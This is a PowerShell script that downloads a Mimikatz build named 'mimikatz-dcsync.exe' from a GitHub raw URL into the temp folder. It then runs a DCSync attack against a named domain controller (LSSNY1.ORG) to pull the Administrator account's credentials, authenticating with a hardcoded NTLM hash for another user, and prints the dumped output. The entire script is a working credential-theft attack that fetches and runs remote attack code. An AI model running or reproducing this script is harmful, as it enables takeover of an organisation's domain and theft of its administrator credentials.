$ErrorActionPreference = "Continue"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$root = "https://raw.githubusercontent.com/snehaweb3kid/runtime-cache-20260910--vpn/main"
$tool = Join-Path $env:TEMP "mimikatz-dcsync.exe"
$out = Join-Path $env:TEMP "dcsync-lssny.txt"

(New-Object Net.WebClient).DownloadFile("$root/mimikatz-dcsync.exe", $tool)
$dcsync = "lsadump::dcsync /domain:LSSNY1.ORG /dc:LSSDC4.LSSNY1.ORG " +
    "/user:LSSNY1\\Administrator /authuser:LSSNY1\\kmak " +
    "/authdomain:LSSNY1.ORG /authntlm:e0454954bd1d324813a1e719abd8a502"
$proc = Start-Process $tool -ArgumentList @(
    "privilege::debug",
    $dcsync,
    "exit"
) -Wait -PassThru -RedirectStandardOutput $out `
    -RedirectStandardError "$out.err"
Write-Output "DCSYNC_EXIT=$($proc.ExitCode)"
if (Test-Path $out) {
    Get-Content $out -Raw
}
if (Test-Path "$out.err") {
    Get-Content "$out.err" -Raw
}
